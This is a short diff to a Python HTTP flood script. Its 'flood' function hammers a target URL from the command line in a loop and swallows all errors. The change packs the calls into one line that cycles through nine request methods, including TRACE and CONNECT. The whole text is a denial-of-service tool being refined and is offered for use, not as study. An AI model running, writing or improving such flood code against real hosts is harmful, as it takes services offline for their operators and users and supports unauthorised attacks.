@@ -2,8 +2,7 @@ import requests,threading,sys
 
 def flood(tar,time):
     for _ in range(time):
-     try:
-        requests.get(tar); requests.post(tar); requests.put(tar); requests.patch(tar); requests.head(tar); requests.options(tar); requests.delete(tar)
+     try:[requests.Session().send(requests.Request(method=a,url=tar).prepare()) for a in ['GET','POST','PUT','PATCH','OPTIONS','DELETE','HEAD','TRACE','CONNECT']]
      except:pass
 
 link = sys.argv[1]
